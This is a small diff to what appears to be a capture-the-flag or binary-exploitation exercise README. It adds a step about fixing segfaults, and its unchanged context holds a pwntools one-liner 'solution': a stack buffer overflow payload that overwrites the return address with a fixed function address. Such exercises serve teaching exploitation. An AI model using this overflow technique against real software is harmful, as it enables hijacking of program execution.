@@ -51,6 +51,7 @@ folder. To fix issue
 4. Overwrite the return address
 5. First function
 6. Second function
+Go through each segfault and fix them
 
 ### Solution
 ```python -c 'from pwn import *; print "A"*176 + "B"*8 + p32(0x080485e6)'```
